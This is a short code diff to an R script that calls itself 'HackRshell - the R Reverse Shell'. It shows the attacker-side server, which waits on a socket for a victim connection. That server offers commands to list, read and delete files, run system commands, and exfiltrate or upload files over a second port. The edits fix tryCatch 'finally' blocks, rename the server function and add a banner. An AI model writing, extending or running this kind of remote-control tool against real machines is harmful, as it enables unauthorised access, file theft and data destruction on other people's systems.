@@ -41,7 +41,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, command) {
   }, error=function(e){
     abortDownload <<- TRUE
     print(paste("Server error receiving file data: ", e$message))
-  }, finally=function() {
+  }, finally={
     safeClose(fileSocket)
   })
   if (!abortDownload) {
@@ -52,7 +52,7 @@ exfiltrateFile <- function(socket, host, secondaryPort, command) {
       print(paste("Downloaded ", fileSize, "bytes"))
     }, error=function(e){
       print(paste("Error writing received data: ", e$message))
-    }, finally=function() {
+    }, finally={
       safeClose(outFile)
     })
   }
@@ -86,7 +86,7 @@ infiltrateFile <- function(socket, host, secondaryPort, command) {
     print(paste("Error loading file: ", e$message))
     writeLines("-1", socket)
     abortUpload <<- TRUE
-  }, finally=function(){
+  }, finally={
     safeClose(targetFile)
   })
   uploadSocket <- NULL
@@ -98,7 +98,7 @@ infiltrateFile <- function(socket, host, secondaryPort, command) {
       print(paste("Sent", fileSize, "bytes!"))
     }, error=function(e){
       print(paste("Error uploading file to client: ", e$message))
-    }, finally=function(){
+    }, finally={
       safeClose(uploadSocket)
     })
   } else {
@@ -116,9 +116,12 @@ printHelpMessage <- function(validCommands) {
   }
 }
 
-server <- function(host="localhost", port=4471, secondaryPort=5472) {
+hRs.server <- function(host="localhost", port=4471, secondaryPort=5472) {
   validCommands <- c("help", "pwd", "dir", "ls", "cd", "rm", "del",
                       "cat", "type", "download", "upload", "sys", "exit")
+  print("HackRshell - the R Reverse Shell", quote=FALSE)
+  print("", quote=FALSE)
+  print("Waiting for connection...", quote=FALSE)
   socket <- socketConnection(host=host, port=port, blocking=TRUE, server=TRUE, encoding="utf-8", timeout=300, open="r+")
   #Ensures the sockets get closed
   on.exit(tryCatch(close(socket), error=function(e){}, warning=function(w){}))
@@ -162,5 +165,5 @@ server <- function(host="localhost", port=4471, secondaryPort=5472) {
   print("Socket closed")
 }
 
-server()
+hRs.server()
 
